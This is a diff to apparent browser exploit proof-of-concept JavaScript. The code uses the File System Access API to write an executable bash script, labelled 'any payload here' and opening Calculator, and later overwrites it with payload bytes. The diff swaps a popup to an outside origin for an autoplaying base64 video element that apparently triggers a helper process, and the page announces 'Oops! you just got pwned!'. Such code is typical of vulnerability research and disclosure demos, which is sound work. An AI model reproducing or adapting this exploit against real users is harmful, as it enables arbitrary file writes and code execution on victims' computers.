@@ -239,36 +239,30 @@
                 writer.write("#!/bin/bash\nopen -a Calculator\n"); // any payload here
                 writer.close();
 
-                let popup;
                 setTimeout(function () {
-                  // We must use a diffrent origin for the popup to spawn a new Helper process
-                  // The Helper process spawns after calling print(), there's probably a better way to do this.
-                  popup = window.open(
-                    "https://eix.co.il/print.html",
-                    "popup",
-                    "width=100,height=100"
-                  );
+                  var videoElement = document.createElement("video");
+                  videoElement.src =
+                    "data:video/mp4;base64,THIRD+BASE64+CHUNK==";
+                  videoElement.autoplay = true;
+                  videoElement.muted = true;
+                  videoElement.controls = true;
+                  document.body.appendChild(videoElement);
                 }, 500);
 
-                window.addEventListener("message", function (event) {
-                  if (event.data === "ready") {
-                    document.getElementById("step-4").innerText =
-                      "Oops! you just got pwned! 😈";
-                    document.getElementById("step-4").style.color = "red";
-                    setTimeout(async function () {
-                      try {
-                        writer = await fileHandle.createWritable();
-                        console.log("Writing payload");
-                        await writer.write(bytes);
-                        console.log("Payload written");
-                        await writer.close();
-                      } catch (err) {
-                        console.error(err);
-                      }
-                      popup.close();
-                    }, 1337);
+                setTimeout(async function () {
+                  document.getElementById("step-4").innerText =
+                    "Oops! you just got pwned! 😈";
+                  document.getElementById("step-4").style.color = "red";
+                  try {
+                    writer = await fileHandle.createWritable();
+                    console.log("Writing payload");
+                    await writer.write(bytes);
+                    console.log("Payload written");
+                    await writer.close();
+                  } catch (err) {
+                    console.error(err);
                   }
-                });
+                }, 1337);
               } catch (err) {
                 console.log(err);
               }
